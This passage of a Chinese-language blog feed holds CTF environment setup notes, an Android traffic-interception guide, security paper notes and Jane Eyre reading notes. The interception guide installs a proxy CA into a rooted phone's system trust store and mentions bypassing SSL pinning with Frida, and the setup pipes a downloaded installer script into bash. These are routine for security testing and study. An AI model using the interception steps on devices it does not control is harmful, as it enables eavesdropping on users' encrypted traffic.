&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ nvm install 20.10.0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Downloading node.js version 20.10.0 &lt;span style="color:#f92672">(&lt;/span>64-bit&lt;span style="color:#f92672">)&lt;/span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Extracting node and npm...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Complete
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>npm v10.2.3 installed successfully.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Installation complete. If you want to use this version, type
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nvm use 20.10.0
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>選擇已安裝的版本
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ nvm use 20.10.0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Now using node v20.10.0 &lt;span style="color:#f92672">(&lt;/span>64-bit&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>接著就可以只用npm / node安裝專案需要的package
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ cd &lt;span style="color:#e6db74">&amp;#34;Double Injection\app&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ls
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 目錄: D:&lt;span style="color:#ae81ff">\D&lt;/span>ouble Injection&lt;span style="color:#ae81ff">\a&lt;/span>pp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Mode LastWriteTime Length Name
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>---- ------------- ------ ----
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-a---- 2023/12/18 下午 05:52 &lt;span style="color:#ae81ff">1786&lt;/span> app.js
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-a---- 2023/12/29 上午 01:19 &lt;span style="color:#ae81ff">1160&lt;/span> exp.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-a---- 2023/12/18 下午 10:16 &lt;span style="color:#ae81ff">13&lt;/span> flag.json
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-a---- 2023/12/18 下午 05:26 &lt;span style="color:#ae81ff">470&lt;/span> init-db.js
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-a---- 2023/12/18 上午 06:16 &lt;span style="color:#ae81ff">110&lt;/span> package.json
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ npm install &lt;span style="color:#75715e"># 安裝所有package.json中的library&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>WSL / Linux
同樣的操作需要再做一次，詳細可以看&lt;a href="https://learn.microsoft.com/zh-tw/windows/dev-environment/javascript/nodejs-on-wsl">MSDN - 在 Windows 子系統 Linux 版 (WSL2) 上安裝 Node.js&lt;/a>
&lt;ol>
&lt;li>Install nvm
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo apt-get install curl
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/master/install.sh | bash
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ nvm --version
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0.39.7
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>Check Current Available Version
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ nvm ls
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-&amp;gt; system
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>iojs -&amp;gt; N/A &lt;span style="color:#f92672">(&lt;/span>default&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>node -&amp;gt; stable &lt;span style="color:#f92672">(&lt;/span>-&amp;gt; N/A&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>default&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>unstable -&amp;gt; N/A &lt;span style="color:#f92672">(&lt;/span>default&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>Install Long Term Support
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ nvm install --lts
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Installing latest LTS version.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Downloading and installing node v20.10.0...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Downloading https://nodejs.org/dist/v20.10.0/node-v20.10.0-linux-x64.tar.xz...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">############################################################################################################ 100.0%&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Computing checksum with sha256sum
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Checksums matched!
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Now using node v20.10.0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Creating default alias: default -&amp;gt; lts/* &lt;span style="color:#f92672">(&lt;/span>-&amp;gt; v20.10.0&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ nvm ls
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-&amp;gt; v20.10.0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> system
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>default -&amp;gt; lts/* &lt;span style="color:#f92672">(&lt;/span>-&amp;gt; v20.10.0&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>iojs -&amp;gt; N/A &lt;span style="color:#f92672">(&lt;/span>default&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>unstable -&amp;gt; N/A &lt;span style="color:#f92672">(&lt;/span>default&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>node -&amp;gt; stable &lt;span style="color:#f92672">(&lt;/span>-&amp;gt; v20.10.0&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>default&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>stable -&amp;gt; 20.10 &lt;span style="color:#f92672">(&lt;/span>-&amp;gt; v20.10.0&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>default&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lts/* -&amp;gt; lts/iron &lt;span style="color:#f92672">(&lt;/span>-&amp;gt; v20.10.0&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lts/argon -&amp;gt; v4.9.1 &lt;span style="color:#f92672">(&lt;/span>-&amp;gt; N/A&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lts/boron -&amp;gt; v6.17.1 &lt;span style="color:#f92672">(&lt;/span>-&amp;gt; N/A&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lts/carbon -&amp;gt; v8.17.0 &lt;span style="color:#f92672">(&lt;/span>-&amp;gt; N/A&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lts/dubnium -&amp;gt; v10.24.1 &lt;span style="color:#f92672">(&lt;/span>-&amp;gt; N/A&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lts/erbium -&amp;gt; v12.22.12 &lt;span style="color:#f92672">(&lt;/span>-&amp;gt; N/A&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lts/fermium -&amp;gt; v14.21.3 &lt;span style="color:#f92672">(&lt;/span>-&amp;gt; N/A&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lts/gallium -&amp;gt; v16.20.2 &lt;span style="color:#f92672">(&lt;/span>-&amp;gt; N/A&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lts/hydrogen -&amp;gt; v18.19.0 &lt;span style="color:#f92672">(&lt;/span>-&amp;gt; N/A&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lts/iron -&amp;gt; v20.10.0
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>Check npm / node Version
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ npm --version
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>10.2.3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ node --version
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>v20.10.0
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>安裝Module(一樣是在有package.json的目錄下)
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ npm install
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ul>
&lt;h2 id="debug-by-vscode">
 Debug By VScode
 &lt;a class="anchor" href="#debug-by-vscode">#&lt;/a>
&lt;/h2>
&lt;p>詳細可以看&lt;a href="https://learn.microsoft.com/zh-tw/training/modules/debug-nodejs/5-analyze-your-program-state">MSDN的教學&lt;/a>
:::info
在debug的過程中，有可能會因為是linux based的路徑，所以造成錯誤，所以最好還是在wsl中用&lt;code>code .&lt;/code>的方式進入VScode，再進行debug，另外提醒，在linux or windows下npm install所載的package會根據OS不一樣而有差異，所以要搞清楚目前的平台是哪一個再進行debug；再另外，因為大部分的題目都是具備docker，所以在build之前要先確定有沒有都完成原本docker幫忙的事情，例如以下script:&lt;/p></description></item><item><title>How to use ZAP/Burp Suite/mitmproxy as Proxy for Android?</title><link>https://bernie6401.github.io/docs/problem-solutions/how-to-use-zap_burp-suite_mitmproxy-as-proxy-for-android_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/problem-solutions/how-to-use-zap_burp-suite_mitmproxy-as-proxy-for-android_/</guid><description>&lt;h1 id="how-to-use-zap-as-proxy">
 How to use ZAP as Proxy?
 &lt;a class="anchor" href="#how-to-use-zap-as-proxy">#&lt;/a>
&lt;/h1>
&lt;ul>
&lt;li>
&lt;p>根據&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>我大概知道怎麼使用，我們通常會使用zap的command line形式進行操作，詳細的參數可以參考&lt;a href="https://www.zaproxy.org/docs/desktop/cmdline/">Official Document&lt;/a>，另外我看ZAP如果要當作Proxy的角色會需要用到ROOT CA憑證，所以如果單純用之前的教學文章會不知到在哪裡產生憑證，他已經移動到Network底下了
![image](&lt;a href="https://hackmd.io/_uploads/B11DaMnpT.png">https://hackmd.io/_uploads/B11DaMnpT.png&lt;/a> =400x)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>目前我把Proxy架好了，看的是&lt;a href="https://hackmd.io/@ZLgd0D1pQcyasZhkkWKG4g/HyFZFPDQu">這篇教學文章-OWASP ZAP操作手冊&lt;/a>，講的非常詳細&lt;/p>
&lt;ol>
&lt;li>在Firefox中搜尋憑證或是cert，直接安裝在ZAP產生的憑證檔案&lt;/li>
&lt;li>在Firefox的setting中搜尋Proxy
![圖片](&lt;a href="https://hackmd.io/_uploads/HJ4NI5Aap.png">https://hackmd.io/_uploads/HJ4NI5Aap.png&lt;/a> =400x)&lt;/li>
&lt;li>設定成如下
![圖片](&lt;a href="https://hackmd.io/_uploads/HJoGB9CTa.png">https://hackmd.io/_uploads/HJoGB9CTa.png&lt;/a> =400x)
只要ZAP有打開，就可以連線出去，但如果Proxy已經setup，卻沒有打開ZAP會通不到外面喔&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ul>
&lt;h2 id="補充">
 補充
 &lt;a class="anchor" href="#%e8%a3%9c%e5%85%85">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>如果上述的步驟已經執行完但Proxy只能攔截到GET Method的封包，就代表憑證爛掉了，和在手機上一樣，但手機會出現這個問題還有可能是SSL Pinning，網頁端只需要重新安裝ZAP Generate的新憑證就好&lt;/li>
&lt;li>如果設定Firefox的Proxy時，是設定成&lt;code>使用系統Proxy設定&lt;/code>，那就要在電腦的設定中，更改Proxy的config
![圖片](&lt;a href="https://hackmd.io/_uploads/HJ6STMP1R.png">https://hackmd.io/_uploads/HJ6STMP1R.png&lt;/a> =400x)
這樣的話ZAP也可以正常運作，但是就不會出現ZAP特定的畫面(功能)
![圖片](&lt;a href="https://hackmd.io/_uploads/ByAxAfPyA.png">https://hackmd.io/_uploads/ByAxAfPyA.png&lt;/a> =400x)
只有設定成&lt;code>手動設定Proxy&lt;/code>才會出現，否則會變成連線不上的畫面
&lt;img src="https://hackmd.io/_uploads/B1vHRzPJ0.png" alt="圖片" />&lt;/li>
&lt;/ol>
&lt;h1 id="how-to-use-burp-suite-as-proxy">
 How to use Burp Suite as Proxy?
 &lt;a class="anchor" href="#how-to-use-burp-suite-as-proxy">#&lt;/a>
&lt;/h1>
&lt;p>這個完全是翻譯並且按照&lt;a href="https://youtu.be/xp8ufidc514?si=4y0JhxW0kbnO1HjF"> Intercepting Android App Traffic with BurpSuite &lt;/a>的影片教學&lt;/p>
&lt;h2 id="prepare">
 Prepare
 &lt;a class="anchor" href="#prepare">#&lt;/a>
&lt;/h2>
&lt;h3 id="有取得root實機的情況下">
 (有取得Root實機的情況下)
 &lt;a class="anchor" href="#%e6%9c%89%e5%8f%96%e5%be%97root%e5%af%a6%e6%a9%9f%e7%9a%84%e6%83%85%e6%b3%81%e4%b8%8b">#&lt;/a>
&lt;/h3>
&lt;p>如果要保險一點零失敗的達成目標，按照影片的步驟和環境比較好，如果是已經有一台取得Root的實機，就可以忽略用VMware開的Emulator&lt;/p>
&lt;ul>
&lt;li>取得Burp Suite Cert(在開啟Burp Suite的前提下)
有關於DER和PEM的背景知識可以參考&lt;a href="https://medium.com/chouhsiang/%e8%83%8c%e6%99%af%e7%9f%a5%e8%ad%98-pem-%e8%88%87-der-dad659e0a40d">[背景知識] 憑證的格式 PEM 與 DER | 自然人憑證開發筆記&lt;/a>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ curl localhost:8080/cert -o cert.der

# 這一段是強制把der檔案轉換成pem檔案
$ openssl x509 -inform der -in cert.der -out cert.pem
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>丟到手機端後直接在手機安裝憑證&lt;/li>
&lt;li>接著就要參考&lt;a href="https://hackmd.io/nAJIgt13TjSZ5nqLR4-BiQ#Install-AlwaysTrustUserCertzip-Module">How to Root Android Phone &amp;amp; Install AlwaysTrustUserCert.zip Module?&lt;/a>這篇文章下面註解的地方重新安裝AlwaysTrustUserCert.zip這個plugin，最保險的做法是
先把之前所有安裝的憑證刪除→
重新啟動→
重新安裝&amp;quot;所有&amp;quot;的憑證→
重新安裝Magisk模組→
Reboot
接著就直接跳到下一段(實際攔截前)&lt;/li>
&lt;/ul>
&lt;h3 id="利用vmware開emulator">
 (利用VMware開Emulator)
 &lt;a class="anchor" href="#%e5%88%a9%e7%94%a8vmware%e9%96%8bemulator">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>VMware 記得啟動 Virtualization&lt;/li>
&lt;li>安裝Genymotion, virtualbox, adb
安裝前先到Genymotion官網註冊帳號
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ wget https://dl.genymotion.com/releases/genymotion-3.6.0/genymotion-3.6.0-linux_x64.bin
$ chmod +x genymotion-3.6.0-linux_x64.bin
$ ./genymotion-3.6.0-linux_x64.bin
$ sudo apt install virtualbox adb -y
$ cd genymotion
$ ./genymotion # login to genymotion
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>選擇Emulator的手機型號就可以開啟一個全新的Emulator&lt;/li>
&lt;li>取得Burp Suite Cert(在開啟Burp Suite的前提下)
有關於DER和PEM的背景知識可以參考&lt;a href="https://medium.com/chouhsiang/%e8%83%8c%e6%99%af%e7%9f%a5%e8%ad%98-pem-%e8%88%87-der-dad659e0a40d">[背景知識] 憑證的格式 PEM 與 DER | 自然人憑證開發筆記&lt;/a>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ curl localhost:8080/cert -o cert.der

# 這一段是強制把der檔案轉換成pem檔案
$ openssl x509 -inform der -in cert.der -out cert.pem

# 這一段是顯示cert.pem這個檔案Subject的MD5 Hash Value，至於他怎麼做hash的，可以參考https://github.com/spacemonkeygo/openssl/issues/112#issuecomment-443313713，他解釋該hash的標的為哪些，並不是針對這整個file做hash
$ openssl x509 -inform PEM -subject_hash_old -in cert.pem
9a5ba575
-----BEGIN CERTIFICATE-----
MIIDpzCCAo+gAwIBAgIEdz+xgjANBgkqhkiG9w0BAQsFADCBijEUMBIGA1UEBhML
UG9ydFN3aWdnZXIxFDASBgNVBAgTC1BvcnRTd2lnZ2VyMRQwEgYDVQQHEwtQb3J0
U3dpZ2dlcjEUMBIGA1UEChMLUG9ydFN3aWdnZXIxFzAVBgNVBAsTDlBvcnRTd2ln
Z2VyIENBMRcwFQYDVQQDEw5Qb3J0U3dpZ2dlciBDQTAeFw0xNDA4MjgxMzUxMzda
Fw0zMzA4MjgxMzUxMzdaMIGKMRQwEgYDVQQGEwtQb3J0U3dpZ2dlcjEUMBIGA1UE
CBMLUG9ydFN3aWdnZXIxFDASBgNVBAcTC1BvcnRTd2lnZ2VyMRQwEgYDVQQKEwtQ
b3J0U3dpZ2dlcjEXMBUGA1UECxMOUG9ydFN3aWdnZXIgQ0ExFzAVBgNVBAMTDlBv
cnRTd2lnZ2VyIENBMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwCM2
OEX9sby5W3ck1djqnohtIpNKIkBWw0qvwDfi17Hvyc0YIUPzQE+6o/a1KRgCS6Ni
2SgcJ/soKcRkMn5nmI5Mh+6w0NGEd13VmIcSkd97RghpeNivd5u0LOHW4KVYmxh9
0pDlt+6DD2zQIShM0hxUTGpaaPaRk9S9z0kWHNyJ9cfy627IWDSl1oNrQvNYTWU4
DhjBa0AOQUjCrTqkCALwCEAErZRGgjeonkola117DFG8twdjdA+55Iegw2Bd8ogd
JafibIUutXwGFiaAxx/ckapkqUKFnjBbXwyfoFmeiuiHqB3oy8Y8tduSh1e9lJNq
bMWW+UDG/4H5kXNOgwIDAQABoxMwETAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3
DQEBCwUAA4IBAQAn4BB23JUP0EThzsQY/299zJW0Z1AquMwYRYtWhhno+OoQ8gHu
zKNQHdV2RHr/Ns4z7tP7aNyWiCgSmmOwJ/0l7pY74NjxbZPdqVnHMy5Vg6ehggOH
ShKk6N561W4856G2AaiOqtY1a84wj1l5GtAtSbfVJtu3SdOvdiR2oD8C8IWx71VN
EGjEuIkbWdyysVQkhXkn1GAl8E3CRPqDrqJL4HA9CSAPEvvhbpUvJ/j+dqp+bH68
kPBVOVVKdzUBbngYeRpSwGm2WlbZ8RiWoeodsixPKiK2tSqtGG+D1H/bOKH/aq8x
PVGwpBZqfagUIDw+E1x1zmbtUkpY5nHCAcEo
-----END CERTIFICATE-----

# 複製cert.pem並改名成9a5ba575.0，會改成這樣是因為手機當中儲存憑證的方式就是這樣
$ cp cert.pem 9a5ba575.0

# 這一段是print出9a5ba575.0的subject，也就是上面做hash的標的就是下面這一串東西，所以只要是PortSwigger的憑證，只要他們沒有改subject，基本上做hash得到的結果都會是9a5ba575
$ openssl x509 -inform PEM -subject -in 9a5ba575.0
subject=C = PortSwigger, ST = PortSwigger, L = PortSwigger, O = PortSwigger, OU = PortSwigger CA, CN = PortSwigger CA
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>丟到手機端中儲存憑證的絕對位址
如果直接用adb push到該位置，會發現錯誤，原因是該位置是read only的狀態，所以我們要進到su進到root權限改變read only的狀態，再把東西丟進去就完成安裝了
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ adb shell
# su
# mount -o remount,rw /
# exit
# exit
$ adb push 9a5ba575.0 /system/etc/security/cacerts/
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="實際攔截前">
 實際攔截前
 &lt;a class="anchor" href="#%e5%af%a6%e9%9a%9b%e6%94%94%e6%88%aa%e5%89%8d">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>打開的Burp Suite一定要把Bind to address改成All interfaces
![圖片](&lt;a href="https://hackmd.io/_uploads/B1HBnVVPR.png">https://hackmd.io/_uploads/B1HBnVVPR.png&lt;/a> =400x)&lt;/li>
&lt;li>設定手機端的網路Proxy
這一部分就跟ZAP當初設定的時候一模一樣，當然也是可以像教學影片那樣用CLI的方式處理
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ adb shell settings put global http_proxy &amp;lt;proxy server ip&amp;gt;:8080 # set phone proxy
$ adb shell settings put global http_proxy :0 # unset phone proxy
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>接下來就可以實際攔截了&lt;/li>
&lt;/ol>
&lt;h2 id="bypass-ssl-pinning-by-frida">
 Bypass SSL Pinning by Frida
 &lt;a class="anchor" href="#bypass-ssl-pinning-by-frida">#&lt;/a>
&lt;/h2>
&lt;p>還記得之前做的實驗&lt;a href="https://hackmd.io/@SBK6401/r155hduCT#%e7%84%a1%e6%b3%95%e4%bd%bf%e7%94%a8">論文筆記&lt;/a>中有提到，有一部分的app就算安裝了SSL Unpinning的Plugin還是無法攔截到流量，根據&lt;a href="https://httptoolkit.com/blog/frida-certificate-pinning/">Defeating Android Certificate Pinning with Frida&lt;/a>文章的說明，Facebook各式各樣的App所使用的憑證標準和實作方式都是自定義的，而不是用標準API，這樣的話用一般的SSL Unpinning就還是不會成功&lt;/p></description></item><item><title>Identifying vulnerabilities of SSL/TLS certificate verification in Android apps with static and dynamic analysis</title><link>https://bernie6401.github.io/docs/survey-papers/android-+-security/identifying-vulnerabilities-of-ssl_tls-certificate-verification-in-android-apps-with-static-and-dynamic-analysis/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/survey-papers/android-+-security/identifying-vulnerabilities-of-ssl_tls-certificate-verification-in-android-apps-with-static-and-dynamic-analysis/</guid><description>&lt;h1 id="identifying-vulnerabilities-of-ssl_tls-certificate-verification-in-android-apps-with-static-and-dynamic-analysis">
 Identifying vulnerabilities of SSL_TLS certificate verification in Android apps with static and dynamic analysis
 &lt;a class="anchor" href="#identifying-vulnerabilities-of-ssl_tls-certificate-verification-in-android-apps-with-static-and-dynamic-analysis">#&lt;/a>
&lt;/h1>
&lt;p>:::info
Wang, Y., Xu, G., Liu, X., Mao, W., Si, C., Pedrycz, W., &amp;amp; Wang, W. (2020). Identifying vulnerabilities of SSL/TLS certificate verification in Android apps with static and dynamic analysis. Journal of Systems and Software, 167, 110609.
:::
這一篇論文對我要做的東西非常類似，雖然本質上不一樣但有很多的觀點以及解決方式是可以參照的&lt;/p>
&lt;h2 id="introduction">
 Introduction
 &lt;a class="anchor" href="#introduction">#&lt;/a>
&lt;/h2>
&lt;p>這篇文章探討了在Android應用程式中SSL/TLS憑證驗證的弱點，並提出了一種名為DCDroid的工具來偵測這些弱點。作者結合靜態和動態分析，分析了來自Google Play和360app的2213個應用程式，發現其中有20.65%可能存在弱點。透過DCDroid在兩部Android智慧手機上執行這些應用程式，最終確認了11.07%的應用程式對MITM和釣魚攻擊存在真正的弱點。&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>SSL/TLS and Android
一般來說，正確的驗證憑證的步驟為&lt;/p>
&lt;ol>
&lt;li>在憑證鏈中的所有憑證有無過期&lt;/li>
&lt;li>憑證或憑證鏈中的根憑證由客戶端的憑證授權單位（CA）簽署&lt;/li>
&lt;li>證書中的網域名稱與所連接的伺服器的網域名稱相符&lt;/li>
&lt;/ol>
&lt;p>但是基於一些原因(例如: 使用self-signed certificate/伺服器的root憑證不在手機的CA list中/糾正某些第三方庫的不安全實作)導致開發者會自行實做一個憑證驗證的方法，而這時候就有可能會產生一些漏洞發生，例如:
:::warning&lt;/p></description></item><item><title>Jane Eyre (簡愛)</title><link>https://bernie6401.github.io/docs/books-notes/jane-eyre-%E7%B0%A1%E6%84%9B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/books-notes/jane-eyre-%E7%B0%A1%E6%84%9B/</guid><description>&lt;h1 id="jane-eyre-簡愛">
 Jane Eyre (簡愛)
 &lt;a class="anchor" href="#jane-eyre-%e7%b0%a1%e6%84%9b">#&lt;/a>
&lt;/h1>
&lt;p>中文譯本 崇文館 2000
![91zU70Aw9IS.&lt;em>AC_UF1000,1000_QL80&lt;/em>](&lt;a href="https://hackmd.io/_uploads/S1iaQyPakx.jpg">https://hackmd.io/_uploads/S1iaQyPakx.jpg&lt;/a> =200x)&lt;/p>
&lt;p>:::spoiler 讀的過程中條列的重點&lt;/p>
&lt;ol>
&lt;li>
&lt;p>用階級交易自由到底划不划算? 簡愛離開會家暴自己的家庭(有毒的家庭要如何和解，從ch20~ch22有提到)，到一個慈善學校，但挨餓受凍&lt;/p>
&lt;/li>
&lt;li>
&lt;p>海倫(簡愛小時候的同學)很奴，很那個年代的思考邏輯(用聖經寬恕別人的惡)，但他已經沒有任何階級可以交換了，難不成要他變成乞丐，就為了逃避看自己不爽的老師?&lt;/p>
&lt;/li>
&lt;li>
&lt;p>目前看到現在，這本書是在講什麼時候該忍耐，什麼時候該反擊，以及各種決定下的後果&lt;/p>
&lt;/li>
&lt;li>
&lt;p>荒唐的教育體制，無法容忍一絲一毫的缺點，荒謬的命令，猶如軍營的紀律&lt;/p>
&lt;/li>
&lt;li>
&lt;p>到第十章在講從家庭到學校的過程，之後就是講述接到家庭教師工作的故事&lt;/p>
&lt;/li>
&lt;li>
&lt;p>目前看到的重點應該會集中在第14章，男主人是一個非常怪的人，會問一些超怪的問題，但也有可能是要夾帶一些觀念，或是之後鋪陳的資訊&lt;/p>
&lt;/li>
&lt;li>
&lt;p>P.148有一個有趣的段落，我不確定原文是不是也是這個意思，但我解讀出兩種可能，阿黛拉是無父無母的小孩這句話&lt;/p>
&lt;/li>
&lt;li>
&lt;p>代表簡愛不認為阿黛拉的生父是羅撤斯特&lt;/p>
&lt;/li>
&lt;li>
&lt;p>代表簡愛認為阿黛拉的生父即使是羅撤斯特，但也沒有得到他的愛&lt;/p>
&lt;/li>
&lt;li>
&lt;p>男女主角感覺很像現代的霸道總裁&lt;/p>
&lt;/li>
&lt;li>
